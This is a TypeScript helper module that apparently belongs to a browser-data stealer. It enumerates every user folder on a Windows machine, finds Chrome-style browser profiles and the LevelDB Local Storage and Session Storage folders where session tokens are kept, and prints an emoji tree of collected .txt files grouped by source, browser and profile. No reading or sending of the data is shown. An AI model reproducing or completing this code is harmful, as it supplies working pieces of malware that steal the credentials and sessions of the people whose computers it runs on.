import fs from 'fs';
import path from 'path';
import os from 'os';

export async function copyFolderContents(source: string, destination: string): Promise<void> {
    if (!fs.existsSync(destination)) {
        fs.mkdirSync(destination, { recursive: true });
    }

    const entries = fs.readdirSync(source, { withFileTypes: true });

    for (const entry of entries) {
        const sourcePath = path.join(source, entry.name);
        const destinationPath = path.join(destination, entry.name);

        if (entry.isDirectory()) {
            await copyFolderContents(sourcePath, destinationPath);
        } else {
            fs.copyFileSync(sourcePath, destinationPath);
        }
    }
}

export async function getUsers(): Promise<string[]> {
    const users: string[] = [];
    const userDir = path.join(process.env.SystemDrive || 'C:', 'Users');

    try {
        const dirs = fs.readdirSync(userDir);
        for (const dir of dirs) {
            if (dir === 'Public' || dir === 'Default' || dir === 'Default User') continue;
            users.push(path.join(userDir, dir));
        }
    } catch (e) {
    }

    if (!users.includes(os.homedir())) {
        users.push(os.homedir());
    }

    return users;
}

export function findLevelDBPaths(basePath: string): string[] {
    const leveldbPaths: string[] = [];

    try {
        const entries = fs.readdirSync(basePath, { withFileTypes: true });

        for (const entry of entries) {
            if (entry.isDirectory()) {
                const fullPath = path.join(basePath, entry.name);

                if (entry.name === 'Local Storage' || entry.name === 'Session Storage') {
                    const leveldbPath = path.join(fullPath, 'leveldb');
                    if (fs.existsSync(leveldbPath)) {
                        leveldbPaths.push(leveldbPath);
                    }
                }

                if (entry.name.startsWith('Profile') || entry.name === 'Default') {
                    const subLeveldbPaths = findLevelDBPaths(fullPath);
                    leveldbPaths.push(...subLeveldbPaths);
                }
            }
        }
    } catch (error) {
    }

    return leveldbPaths;
}

export async function getBrowserProfiles(fullPath: string, browser: string): Promise<Array<{ name: string; profile: string; path: string }>> {
    try {
        if (!fs.existsSync(fullPath)) return [];
        const dirs = fs.readdirSync(fullPath);

        return dirs.reduce((profiles: Array<{ name: string; profile: string; path: string }>, dir: string) => {
            if (dir.includes("Profile") || dir === "Default") {
                const profilePath = path.join(fullPath, dir);

                const exists = profiles.some(profile => profile.path === profilePath);
                if (!exists) {
                    profiles.push({
                        name: browser,
                        profile: dir,
                        path: profilePath,
                    });
                }
            }

            return profiles;
        }, []);
    } catch (e) {
        return [];
    }
}

export async function getProfiles(userDataPath: string): Promise<string[]> {
    try {
        const dirs = await fs.promises.readdir(userDataPath);
        return dirs.filter(name => name === 'Default' || name.startsWith('Profile'));
    } catch {
        return [];
    }
}

export function buildFolderSummary(dirPath: string): string {
    const structure: Record<string, Record<string, Record<string, string[]>>> = {};

    function walk(currentPath: string, parts: string[] = []): void {
        const entries = fs.readdirSync(currentPath, { withFileTypes: true });

        for (const entry of entries) {
            const fullPath = path.join(currentPath, entry.name);

            if (entry.isDirectory()) {
                walk(fullPath, [...parts, entry.name]);
            } else if (entry.isFile() && entry.name.endsWith('.txt')) {
                if (parts.length < 2) continue;

                const source = parts[0];
                const browser = parts[1];
                const profile = parts.length >= 3 ? parts[parts.length - 1] : 'General';

                const rootGroup = structure[source] ??= {};
                const browserGroup = rootGroup[browser] ??= {};
                const profileList = browserGroup[profile] ??= [];

                profileList.push(entry.name);
            }
        }
    }

    walk(dirPath);

    const treeLines = ['🗂️'];

    for (const [source, browsers] of Object.entries(structure)) {
        treeLines.push(`├── 🗃️ ${source}`);
        const browserEntries = Object.entries(browsers);
        browserEntries.forEach(([browser, profiles], browserIndex) => {
            const isLastBrowser = browserIndex === browserEntries.length - 1;
            const browserLine = isLastBrowser ? '└──' : '├──';
            treeLines.push(`│   ${browserLine} 🧭 ${browser}`);

            const profileEntries = Object.entries(profiles);
            profileEntries.forEach(([profile, files], profileIndex) => {
                const isLastProfile = profileIndex === profileEntries.length - 1;
                const profileLine = isLastProfile ? '└──' : '├──';
                const browserPrefix = isLastBrowser ? '    ' : '│   ';
                treeLines.push(`${browserPrefix}   ${profileLine} 👤 ${profile}`);

                files.forEach((file, i) => {
                    const isLastFile = i === files.length - 1;
                    const fileLine = isLastFile ? '└──' : '├──';
                    const profilePrefix = browserPrefix + (isLastProfile ? '    ' : '│   ');
                    treeLines.push(`${profilePrefix}   ${fileLine} 📄 ${file}`);
                });
            });
        });
    }

    return treeLines.join('\n');
}
